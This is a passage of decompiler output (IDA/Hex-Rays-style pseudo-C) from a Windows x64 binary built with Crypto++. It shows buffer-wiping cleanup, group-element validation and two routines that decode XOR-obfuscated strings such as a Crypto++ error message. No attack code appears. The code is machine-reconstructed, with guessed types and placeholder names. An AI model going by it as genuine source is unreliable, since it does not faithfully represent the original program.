    free(v8);
    memset(v22, 0, v51);
    free(v22);
    sub_140023D40((__int64)&v47);
    if ( v46 )
      (**v46)(v46, 1i64);
  }
  v33 = v45;
  memset(v45, 0, 8 * v44);
  free(v33);
  memset(v13, 0, v11);
  free(v13);
  if ( v73 >= 0x10 )
    operator delete(Src);
  LOBYTE(Src) = 0;
  DstSize = 0i64;
  v73 = 15i64;
  v34 = v57;
  memset(v57, 0, 8 * v56);
  free(v34);
  v35 = v50;
  memset(v50, 0, 8 * v49);
  free(v35);
  return v6;
}
// 1400A6938: using guessed type __int64 (__fastcall *off_1400A6938)(void *);
// 1400A6978: using guessed type void *off_1400A6978;
// 1400A6A20: using guessed type __int64 (__fastcall *off_1400A6A20[11])();
// 1400A6A78: using guessed type __int64 (__fastcall *off_1400A6A78)(void *);
// 1400A6AB8: using guessed type __int64 (__fastcall *off_1400A6AB8[11])();
// 1400A6B18: using guessed type __int64 (__fastcall *off_1400A6B18)(void *);

//----- (0000000140026420) ----------------------------------------------------
_QWORD *__fastcall sub_140026420(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v5; // rsi
  _QWORD *v6; // rbx
  void *v7; // r12
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  unsigned int v12; // eax
  size_t v13; // rdi
  void *v14; // r15
  __int64 v15; // rax
  __int64 v16; // rdx
  unsigned int v17; // eax
  size_t v18; // r14
  void *v19; // r13
  __int64 v20; // rax
  unsigned int v21; // eax
  __int64 v22; // rdi
  _QWORD *v23; // rax
  _QWORD *v24; // rax
  rsize_t v25; // r14
  const void *v26; // rdi
  void *v27; // rsi
  __int64 v28; // rax
  unsigned int v29; // eax
  unsigned __int64 v30; // rcx
  void *v31; // rdx
  void *v32; // rdx
  void *v33; // rdx
  void *v34; // rdx
  void *v35; // rdx
  __int64 (__fastcall **v37)(void *); // [rsp+40h] [rbp-C0h]
  __int64 (__fastcall **v38)(void *); // [rsp+48h] [rbp-B8h]
  void **v39; // [rsp+50h] [rbp-B0h]
  signed int *v40; // [rsp+58h] [rbp-A8h]
  __int64 v41; // [rsp+78h] [rbp-88h]
  void *v42; // [rsp+80h] [rbp-80h]
  void (__fastcall ***v43)(_QWORD, signed __int64); // [rsp+98h] [rbp-68h]
  char v44; // [rsp+A0h] [rbp-60h]
  unsigned __int64 v45; // [rsp+138h] [rbp+38h]
  void *v46; // [rsp+140h] [rbp+40h]
  unsigned __int64 v47; // [rsp+150h] [rbp+50h]
  void *v48; // [rsp+158h] [rbp+58h]
  unsigned __int64 v49; // [rsp+168h] [rbp+68h]
  void *v50; // [rsp+170h] [rbp+70h]
  char v51; // [rsp+178h] [rbp+78h]
  __int64 v52; // [rsp+188h] [rbp+88h]
  void *v53; // [rsp+190h] [rbp+90h]
  char v54; // [rsp+1A0h] [rbp+A0h]
  __int64 v55; // [rsp+1B0h] [rbp+B0h]
  void *Memory; // [rsp+1B8h] [rbp+B8h]
  __int64 v57; // [rsp+1C8h] [rbp+C8h]
  __int64 v58; // [rsp+1D0h] [rbp+D0h]
  rsize_t v59; // [rsp+1E0h] [rbp+E0h]
  void *v60; // [rsp+1E8h] [rbp+E8h]
  void *v61; // [rsp+1F0h] [rbp+F0h]
  __int64 v62; // [rsp+200h] [rbp+100h]
  unsigned __int64 v63; // [rsp+208h] [rbp+108h]
  void *Src; // [rsp+210h] [rbp+110h]
  rsize_t DstSize; // [rsp+220h] [rbp+120h]
  unsigned __int64 v66; // [rsp+228h] [rbp+128h]
  void *Dst; // [rsp+230h] [rbp+130h]
  __int64 v68; // [rsp+240h] [rbp+140h]
  unsigned __int64 v69; // [rsp+248h] [rbp+148h]

  v57 = -2i64;
  v5 = a4;
  v6 = (_QWORD *)a2;
  v58 = a2;
  v7 = 0i64;
  sub_140036DA0((__int64)&v37, 1);
  v37 = &off_1400A6B18;
  v40 = (signed int *)&unk_1400A6B10;
  sub_140022DC0((__int64)&v38, 0);
  v38 = &off_1400A6938;
  v39 = &off_1400A6978;
  *(signed int **)((char *)&v40 + v40[1]) = (signed int *)off_1400A6A20;
  *(_DWORD *)((char *)&v39 + v40[1] + 4) = 0;
  v38 = &off_1400A6A78;
  v39 = &off_1400A6978;
  *(signed int **)((char *)&v40 + v40[1]) = (signed int *)off_1400A6AB8;
  *(_DWORD *)((char *)&v39 + v40[1] + 4) = 0;
  sub_140028110(&v38, a5, 256i64);
  v8 = v38[4](&v38);
  sub_14003C000((__int64)&v51, v8);
  v9 = ((__int64 (__fastcall *)(void ***))v39[1])(&v39);
  sub_14003C000((__int64)&v54, v9);
  v10 = v37[15](&v37);
  v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v10 + 64i64))(v10);
  v12 = sub_1400453C0(v11);
  v13 = v12;
  v45 = v12;
  sub_1400255A0(v12);
  if ( v13 )
    v14 = sub_14003A000(v13);
  else
    v14 = 0i64;
  v46 = v14;
  v15 = v37[15](&v37);
  LOBYTE(v16) = 1;
  v17 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v15 + 96i64))(v15, v16);
  v18 = v17;
  v47 = v17;
  sub_1400255A0(v17);
  if ( v18 )
    v19 = sub_14003A000(v18);
  else
    v19 = 0i64;
  v48 = v19;
  v20 = v37[15](&v37);
  v21 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v20 + 96i64))(v20, 0i64);
  v22 = v21;
  v49 = v21;
  sub_1400255A0(v21);
  if ( v22 )
    v7 = sub_14003A000((unsigned int)v22);
  v50 = v7;
  sub_140037EB0((__int64)&v37, a5, (__int64)v14, (__int64)v19);
  v23 = sub_1400282B0(&v61, (__int64)&v51);
  (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v5 + 8i64))(v5, v23);
  if ( v63 >= 0x10 )
    operator delete(v61);
  v24 = sub_1400282B0(&v61, (__int64)&v54);
  (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v5 + 8i64))(v5, v24);
  if ( v63 >= 0x10 )
    operator delete(v61);
  v69 = 15i64;
  v68 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, v19, v18);
  (*(void (__fastcall **)(__int64, void **))(*(_QWORD *)v5 + 8i64))(v5, &Dst);
  (*(void (__fastcall **)(__int64, void **))(*(_QWORD *)v5 + 16i64))(v5, &Src);
  v25 = DstSize;
  v26 = &Src;
  if ( v66 >= 0x10 )
    v26 = Src;
  v59 = DstSize;
  sub_1400255A0(DstSize);
  if ( v25 )
    v27 = sub_14003A000(v25);
  else
    v27 = 0i64;
  v60 = v27;
  if ( v26 && v27 )
  {
    memcpy_s(v27, v25, v26, v25);
  }
  else if ( v25 )
  {
    memset(v27, 0, v25);
  }
  if ( sub_140024DB0((__int64)&v37, (__int64)v7, (__int64)v14, (__int64)v27, 1u) )
  {
    v28 = v37[15](&v37);
    v29 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v28 + 96i64))(v28, 0i64);
    v63 = 15i64;
    v62 = 0i64;
    LOBYTE(v61) = 0;
    sub_140004F20(&v61, v7, v29);
    v6[3] = 15i64;
    v6[2] = 0i64;
    *(_BYTE *)v6 = 0;
    v30 = v63;
    if ( v63 >= 0x10 )
    {
      *v6 = v61;
      v61 = 0i64;
    }
    else if ( v62 != -1 )
    {
      memmove(v6, &v61, v62 + 1);
      v30 = v63;
    }
    v6[2] = v62;
    v6[3] = v30;
    v63 = 15i64;
    v62 = 0i64;
    LOBYTE(v61) = 0;
    memset(v27, 0, v25);
    free(v27);
    if ( v66 >= 0x10 )
      operator delete(Src);
    v66 = 15i64;
    DstSize = 0i64;
    LOBYTE(Src) = 0;
    if ( v69 >= 0x10 )
      operator delete(Dst);
    v69 = 15i64;
    v68 = 0i64;
    LOBYTE(Dst) = 0;
    memset(v7, 0, v49);
    free(v7);
    memset(v19, 0, v47);
    free(v19);
    memset(v14, 0, v45);
    free(v14);
    v31 = Memory;
    memset(Memory, 0, 8 * v55);
    free(v31);
    v32 = v53;
    memset(v53, 0, 8 * v52);
    free(v32);
    sub_140023D40((__int64)&v44);
    if ( v43 )
      (**v43)(v43, 1i64);
  }
  else
  {
    v6[3] = 15i64;
    v6[2] = 0i64;
    *(_BYTE *)v6 = 0;
    sub_140004F20(v6, byte_1400A3400, 0i64);
    memset(v27, 0, v25);
    free(v27);
    if ( v66 >= 0x10 )
      operator delete(Src);
    v66 = 15i64;
    DstSize = 0i64;
    LOBYTE(Src) = 0;
    if ( v69 >= 0x10 )
      operator delete(Dst);
    v69 = 15i64;
    v68 = 0i64;
    LOBYTE(Dst) = 0;
    memset(v7, 0, v49);
    free(v7);
    memset(v19, 0, v47);
    free(v19);
    memset(v14, 0, v45);
    free(v14);
    v33 = Memory;
    memset(Memory, 0, 8 * v55);
    free(v33);
    v34 = v53;
    memset(v53, 0, 8 * v52);
    free(v34);
    sub_140023D40((__int64)&v44);
    if ( v43 )
      (**v43)(v43, 1i64);
  }
  v35 = v42;
  memset(v42, 0, 8 * v41);
  free(v35);
  return v6;
}
// 140028110: using guessed type __int64 __fastcall sub_140028110(_QWORD, _QWORD, _QWORD);
// 1400A6938: using guessed type __int64 (__fastcall *off_1400A6938)(void *);
// 1400A6978: using guessed type void *off_1400A6978;
// 1400A6A20: using guessed type __int64 (__fastcall *off_1400A6A20[11])();
// 1400A6A78: using guessed type __int64 (__fastcall *off_1400A6A78)(void *);
// 1400A6AB8: using guessed type __int64 (__fastcall *off_1400A6AB8[11])();
// 1400A6B18: using guessed type __int64 (__fastcall *off_1400A6B18)(void *);

//----- (0000000140026B10) ----------------------------------------------------
__int64 __fastcall sub_140026B10(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbp
  __int64 v4; // r14
  __int64 v5; // rsi
  _QWORD *v6; // rax
  __int64 v7; // rdi
  _QWORD *v8; // rbx
  __int64 v9; // rax

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (_QWORD *)(*(__int64 (__cdecl **)(__int64))(*(_QWORD *)a1 + 48i64))(a1);
  v7 = *v6;
  v8 = v6;
  v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 40i64))(v5);
  (*(void (__fastcall **)(_QWORD *, __int64, __int64, __int64))(v7 + 48))(v8, v4, v9, v3);
  return v4;
}

//----- (0000000140026B80) ----------------------------------------------------
void *__fastcall sub_140026B80(__int64 a1, void *a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // rsi
  void *v6; // rbp
  __int64 v7; // rbx
  signed int v8; // ST20_4

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  sub_14003C210(a2);
  v8 = 1;
  (*(void (__fastcall **)(__int64, void *, __int64, __int64, signed int))(*(_QWORD *)v7 + 160i64))(v7, v6, v5, v4, v8);
  return v6;
}

//----- (0000000140026C00) ----------------------------------------------------
_BOOL8 __fastcall sub_140026C00(__int64 a1)
{
  __int64 v1; // rdi
  __int64 v2; // rax
  bool v3; // bl
  void *v4; // rdx
  void *v5; // rdx
  char v7; // [rsp+28h] [rbp-60h]
  __int64 v8; // [rsp+38h] [rbp-50h]
  void *v9; // [rsp+40h] [rbp-48h]
  char v10; // [rsp+50h] [rbp-38h]
  __int64 v11; // [rsp+60h] [rbp-28h]
  void *Memory; // [rsp+68h] [rbp-20h]

  v1 = a1;
  sub_14003C0E0((__int64)&v7, 2);
  v2 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v1 + 88i64))(v1, &v10);
  v3 = (unsigned int)sub_140045A60(v2, (__int64)&v7) == 0;
  v4 = Memory;
  memset(Memory, 0, 8 * v11);
  free(v4);
  v5 = v9;
  memset(v9, 0, 8 * v8);
  free(v5);
  return v3;
}

//----- (0000000140026CA0) ----------------------------------------------------
void __fastcall sub_140026CA0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r15
  __int64 v4; // rbp
  __int64 v5; // r14
  __int64 v6; // rax
  __int64 v7; // rsi
  __int64 v8; // rbx
  __int64 v9; // rdi
  __int64 v10; // rax
  void *v11; // rdx
  unsigned int v12; // eax
  void *v13; // rdx
  char v14; // [rsp+48h] [rbp-70h]
  __int64 v15; // [rsp+58h] [rbp-60h]
  void *v16; // [rsp+60h] [rbp-58h]
  char v17; // [rsp+70h] [rbp-48h]
  __int64 v18; // [rsp+80h] [rbp-38h]
  void *Memory; // [rsp+88h] [rbp-30h]

  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 120i64))();
  v7 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v6 + 72i64))(v6, &v17);
  v8 = sub_140049E30();
  v9 = sub_14004C270();
  v10 = sub_140049E30();
  sub_14003BED0(&v14, v4, v10, v7, 0, v9, v8);
  v11 = Memory;
  memset(Memory, 0, 8 * v18);
  free(v11);
  v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 64i64))(v5);
  sub_140047070((__int64)&v14, v3, v12, 0);
  v13 = v16;
  memset(v16, 0, 8 * v15);
  free(v13);
}

//----- (0000000140026DA0) ----------------------------------------------------
void __fastcall sub_140026DA0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbp
  __int64 v5; // rsi
  unsigned __int64 v6; // r12
  void *v7; // r15
  unsigned int v8; // eax
  size_t v9; // rdi
  void *v10; // rbx
  unsigned __int64 v11; // rbp
  void *v12; // r13
  unsigned __int64 v13; // r14
  void *v14; // rax
  __int64 v15; // rbx
  __int64 v16; // ST20_8
  char v17; // al
  size_t *v18; // rbx
  size_t *v19; // rax
  _QWORD *v20; // rdi
  void *Memory; // [rsp+30h] [rbp-188h]
  void *v22; // [rsp+38h] [rbp-180h]
  __int64 v23; // [rsp+40h] [rbp-178h]
  __int64 v24; // [rsp+48h] [rbp-170h]
  unsigned __int64 v25; // [rsp+60h] [rbp-158h]
  __int64 (__fastcall **v26)(void *); // [rsp+C0h] [rbp-F8h]
  int v27; // [rsp+D8h] [rbp-E0h]
  char Dst; // [rsp+E0h] [rbp-D8h]
  __int64 v29; // [rsp+F0h] [rbp-C8h]
  __int64 v30; // [rsp+F8h] [rbp-C0h]
  char Src; // [rsp+100h] [rbp-B8h]
  char v32; // [rsp+120h] [rbp-98h]
  char v33; // [rsp+140h] [rbp-78h]

  v24 = a4;
  v23 = a3;
  v4 = a2;
  v5 = a1;
  sub_140027080(a1, a2, a3, a4);
  if ( sub_140050CE0() )
  {
    v6 = (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)v5 + 64i64))(v5);
    sub_1400255A0(v6);
    if ( v6 )
      v7 = sub_14003A000(v6);
    else
      v7 = 0i64;
    (*(void (__fastcall **)(__int64, __int64, void *))(*(_QWORD *)v5 + 80i64))(v5, v4, v7);
    v8 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 72i64))(v5);
    v9 = v8;
    v25 = v8;
    sub_1400255A0(v8);
    if ( v9 )
      v10 = sub_14003A000(v9);
    else
      v10 = 0i64;
    v22 = v10;
    sub_140027080(v5, v4, (__int64)v7, (__int64)v10);
    v11 = (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)v5 + 56i64))(v5);
    sub_1400255A0(v11);
    if ( v11 )
      v12 = sub_14003A000(v11);
    else
      v12 = 0i64;
    v13 = (*(unsigned int (__fastcall **)(__int64))(*(_QWORD *)v5 + 56i64))(v5);
    sub_1400255A0(v13);
    if ( v13 )
      v14 = sub_14003A000(v13);
    else
      v14 = 0i64;
    Memory = v14;
    v15 = (*(unsigned __int8 (__fastcall **)(__int64, void *, __int64, void *, char))(*(_QWORD *)v5 + 104i64))(
            v5,
            v12,
            v23,
            v10,
            1);
    LOBYTE(v16) = 1;
    v17 = (*(__int64 (__fastcall **)(__int64, void *, void *, __int64, __int64))(*(_QWORD *)v5 + 104i64))(
            v5,
            Memory,
            v7,
            v24,
            v16);
    if ( !(_BYTE)v15 || !v17 || v11 != v13 || !sub_14003A0A0((__int64)v12, (__int64)Memory, v11) )
    {
      v18 = sub_140027D10(&Src);
      v19 = (size_t *)(*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)v5 + 16i64))(v5, &v33);
      v20 = sub_14001DE70(&v32, v19, v18);
      std::exception::exception((std::exception *)&v26);
      v26 = &off_1400A8798;
      v27 = 6;
      v30 = 15i64;
      v29 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, v20, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      v26 = &off_1400A8798;
      CxxThrowException(&v26, &_TI3_AVcls_079_CryptoPP__);
    }
    memset(Memory, 0, v13);
    free(Memory);
    memset(v12, 0, v11);
    free(v12);
    memset(v22, 0, v25);
    free(v22);
    memset(v7, 0, v6);
    free(v7);
  }
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3CD8: using guessed type int _TI3_AVcls_079_CryptoPP__;

//----- (0000000140027080) ----------------------------------------------------
void __fastcall sub_140027080(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbp
  __int64 v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rsi
  unsigned int v8; // eax
  __int64 v9; // rdx
  void *v10; // rdx
  void *v11; // rdx
  char v12; // [rsp+28h] [rbp-60h]
  __int64 v13; // [rsp+38h] [rbp-50h]
  void *Memory; // [rsp+40h] [rbp-48h]
  char v15; // [rsp+50h] [rbp-38h]
  __int64 v16; // [rsp+60h] [rbp-28h]
  void *v17; // [rsp+68h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a1;
  v7 = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)a1 + 120i64))(a1);
  v8 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v6 + 64i64))(v6);
  sub_14003C170(&v15, v5, v8, 0);
  (*(void (__fastcall **)(__int64, char *, char *))(*(_QWORD *)v7 + 24i64))(v7, &v12, &v15);
  LOBYTE(v9) = 1;
  (*(void (__fastcall **)(__int64, __int64, char *, __int64))(*(_QWORD *)v7 + 104i64))(v7, v9, &v12, v4);
  v10 = Memory;
  memset(Memory, 0, 8 * v13);
  free(v10);
  v11 = v17;
  memset(v17, 0, 8 * v16);
  free(v11);
}

//----- (0000000140027150) ----------------------------------------------------
signed __int64 __fastcall sub_140027150(__int64 a1, unsigned __int8 (__fastcall ***a2)(_QWORD))
{
  __int64 v2; // rbx
  bool v3; // zf
  signed __int64 result; // rax

  v2 = a1;
  v3 = (**a2)(a2) == 0;
  result = v2 + 8;
  if ( v3 )
    result = *(_QWORD *)(v2 + 96);
  return result;
}

//----- (0000000140027180) ----------------------------------------------------
signed __int64 __fastcall sub_140027180(__int64 a1)
{
  return a1 + 80;
}

//----- (0000000140027190) ----------------------------------------------------
__int64 __fastcall sub_140027190(__int64 a1, __int64 a2)
{
  __int64 v2; // rbp
  __int64 v3; // rsi
  __int64 v4; // rbx
  __int64 v5; // rax
  void *v6; // rdx
  char v8; // [rsp+30h] [rbp-38h]
  __int64 v9; // [rsp+40h] [rbp-28h]
  void *Memory; // [rsp+48h] [rbp-20h]

  v2 = a2;
  v3 = a1;
  v4 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 80i64))(a1, &v8);
  v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 64i64))(v3);
  sub_140024770(v2, v4, v5);
  v6 = Memory;
  memset(Memory, 0, 8 * v9);
  free(v6);
  return v2;
}

//----- (0000000140027220) ----------------------------------------------------
__int64 __fastcall sub_140027220(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 40i64))();
}

//----- (0000000140027230) ----------------------------------------------------
__int64 __fastcall sub_140027230(__int64 a1, int a2)
{
  return (unsigned int)(a2 - 1);
}

//----- (0000000140027240) ----------------------------------------------------
__int64 __fastcall sub_140027240(__int64 a1)
{
  __int64 v1; // rax

  v1 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 32i64))(a1 - 8);
  return sub_1400453C0(v1);
}

//----- (0000000140027260) ----------------------------------------------------
_QWORD *__fastcall sub_140027260(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA368;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA368 & 1 )
  {
    v5 = byte_1400DA364;
  }
  else
  {
    v4 = 69069 * dword_1400DA358 + 1234567;
    v1 = dword_1400DA368 | 1;
    dword_1400DA358 = v4;
    dword_1400DA368 |= 1u;
    dword_1400DA350 = HIWORD(dword_1400DA350) + 36969 * (unsigned __int16)dword_1400DA350;
    LOBYTE(v4) = (BYTE2(dword_1400DA360) + 80 * dword_1400DA360) ^ v4;
    dword_1400DA360 = HIWORD(dword_1400DA360) + 18000 * (unsigned __int16)dword_1400DA360;
    v5 = (((unsigned int)dword_1400DA354 >> 13) ^ 32 * dword_1400DA354 ^ dword_1400DA354) + v4;
    dword_1400DA354 ^= ((unsigned int)dword_1400DA354 >> 13) ^ 32 * (dword_1400DA354 ^ (dword_1400DA354 << 12));
    byte_1400DA364 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA368 = v1 | 2;
    byte_1400DA370[0] = v5 ^ 0x43;
    byte_1400DA371 = (v5 - 1) ^ 0x72;
    byte_1400DA372 = (v5 - 2) ^ 0x79;
    byte_1400DA373 = (v5 - 3) ^ 0x70;
    byte_1400DA374 = (v5 - 4) ^ 0x74;
    byte_1400DA375 = (v5 - 5) ^ 0x6F;
    byte_1400DA376 = (v5 - 6) ^ 0x50;
    byte_1400DA377 = (v5 - 7) ^ 0x50;
    byte_1400DA378 = (v5 - 8) ^ 0x3A;
    byte_1400DA379 = (v5 - 9) ^ 0x20;
    byte_1400DA37A = (v5 - 10) ^ 0x69;
    byte_1400DA37B = (v5 - 11) ^ 0x6E;
    byte_1400DA37C = (v5 - 12) ^ 0x76;
    byte_1400DA37D = (v5 - 13) ^ 0x61;
    byte_1400DA37E = (v5 - 14) ^ 0x6C;
    byte_1400DA37F = (v5 - 15) ^ 0x69;
    byte_1400DA380 = (v5 - 16) ^ 0x64;
    byte_1400DA381 = (v5 - 17) ^ 0x20;
    byte_1400DA382 = (v5 - 18) ^ 0x67;
    byte_1400DA383 = (v5 - 19) ^ 0x72;
    byte_1400DA384 = (v5 - 20) ^ 0x6F;
    byte_1400DA385 = (v5 - 21) ^ 0x75;
    byte_1400DA386 = (v5 - 22) ^ 0x70;
    byte_1400DA387 = (v5 - 23) ^ 0x20;
    byte_1400DA388 = (v5 - 24) ^ 0x65;
    byte_1400DA389 = (v5 - 25) ^ 0x6C;
    byte_1400DA38A = (v5 - 26) ^ 0x65;
    byte_1400DA38B = (v5 - 27) ^ 0x6D;
    byte_1400DA38C = (v5 - 28) ^ 0x65;
    byte_1400DA38D = (v5 - 29) ^ 0x6E;
    byte_1400DA38E = (v5 - 30) ^ 0x74;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x1Fui64 )
  {
    sub_140004790(Src, 0x1Fui64, 0i64);
    v5 = byte_1400DA364;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  *((_DWORD *)v6 + 6) = 0;
  *((_WORD *)v6 + 14) = 0;
  *((_BYTE *)v6 + 30) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 31i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 31) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA370[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x1F );
  return v3;
}
// 1400DA350: using guessed type int dword_1400DA350;
// 1400DA354: using guessed type int dword_1400DA354;
// 1400DA358: using guessed type int dword_1400DA358;
// 1400DA360: using guessed type int dword_1400DA360;
// 1400DA364: using guessed type char byte_1400DA364;
// 1400DA368: using guessed type int dword_1400DA368;
// 1400DA371: using guessed type char byte_1400DA371;
// 1400DA372: using guessed type char byte_1400DA372;
// 1400DA373: using guessed type char byte_1400DA373;
// 1400DA374: using guessed type char byte_1400DA374;
// 1400DA375: using guessed type char byte_1400DA375;
// 1400DA376: using guessed type char byte_1400DA376;
// 1400DA377: using guessed type char byte_1400DA377;
// 1400DA378: using guessed type char byte_1400DA378;
// 1400DA379: using guessed type char byte_1400DA379;
// 1400DA37A: using guessed type char byte_1400DA37A;
// 1400DA37B: using guessed type char byte_1400DA37B;
// 1400DA37C: using guessed type char byte_1400DA37C;
// 1400DA37D: using guessed type char byte_1400DA37D;
// 1400DA37E: using guessed type char byte_1400DA37E;
// 1400DA37F: using guessed type char byte_1400DA37F;
// 1400DA380: using guessed type char byte_1400DA380;
// 1400DA381: using guessed type char byte_1400DA381;
// 1400DA382: using guessed type char byte_1400DA382;
// 1400DA383: using guessed type char byte_1400DA383;
// 1400DA384: using guessed type char byte_1400DA384;
// 1400DA385: using guessed type char byte_1400DA385;
// 1400DA386: using guessed type char byte_1400DA386;
// 1400DA387: using guessed type char byte_1400DA387;
// 1400DA388: using guessed type char byte_1400DA388;
// 1400DA389: using guessed type char byte_1400DA389;
// 1400DA38A: using guessed type char byte_1400DA38A;
// 1400DA38B: using guessed type char byte_1400DA38B;
// 1400DA38C: using guessed type char byte_1400DA38C;
// 1400DA38D: using guessed type char byte_1400DA38D;
// 1400DA38E: using guessed type char byte_1400DA38E;

//----- (0000000140027560) ----------------------------------------------------
_QWORD *__fastcall sub_140027560(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DA3CC;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DA3CC & 1 )
  {
    v5 = byte_1400DA3CB;
  }
  else
  {
    v4 = 69069 * dword_1400DA358 + 1234567;
    v1 = dword_1400DA3CC | 1;
    dword_1400DA358 = v4;
    dword_1400DA3CC |= 1u;
    dword_1400DA350 = HIWORD(dword_1400DA350) + 36969 * (unsigned __int16)dword_1400DA350;
    LOBYTE(v4) = (BYTE2(dword_1400DA360) + 80 * dword_1400DA360) ^ v4;
    dword_1400DA360 = HIWORD(dword_1400DA360) + 18000 * (unsigned __int16)dword_1400DA360;
    v5 = (((unsigned int)dword_1400DA354 >> 13) ^ 32 * dword_1400DA354 ^ dword_1400DA354) + v4;
    dword_1400DA354 ^= ((unsigned int)dword_1400DA354 >> 13) ^ 32 * (dword_1400DA354 ^ (dword_1400DA354 << 12));
    byte_1400DA3CB = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA3CC = v1 | 2;
    byte_1400DA3D0[0] = v5 ^ 0x66;
    byte_1400DA3D1 = (v5 - 1) ^ 0x75;
    byte_1400DA3D2 = (v5 - 2) ^ 0x6E;
    byte_1400DA3D3 = (v5 - 3) ^ 0x63;
    byte_1400DA3D4 = (v5 - 4) ^ 0x74;
    byte_1400DA3D5 = (v5 - 5) ^ 0x69;
    byte_1400DA3D6 = (v5 - 6) ^ 0x6F;
    byte_1400DA3D7 = (v5 - 7) ^ 0x6E;
    byte_1400DA3D8 = (v5 - 8) ^ 0x31;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 9ui64 )
  {
    sub_140004790(Src, 9ui64, 0i64);
    v5 = byte_1400DA3CB;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_BYTE *)v6 + 8) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 9i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 9) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA3D0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 9 );
  return v3;
}
// 1400DA350: using guessed type int dword_1400DA350;
// 1400DA354: using guessed type int dword_1400DA354;
// 1400DA358: using guessed type int dword_1400DA358;
// 1400DA360: using guessed type int dword_1400DA360;
// 1400DA3CB: using guessed type char byte_1400DA3CB;
// 1400DA3CC: using guessed type int dword_1400DA3CC;
// 1400DA3D1: using guessed type char byte_1400DA3D1;
// 1400DA3D2: using guessed type char byte_1400DA3D2;
// 1400DA3D3: using guessed type char byte_1400DA3D3;
// 1400DA3D4: using guessed type char byte_1400DA3D4;
// 1400DA3D5: using guessed type char byte_1400DA3D5;
// 1400DA3D6: using guessed type char byte_1400DA3D6;
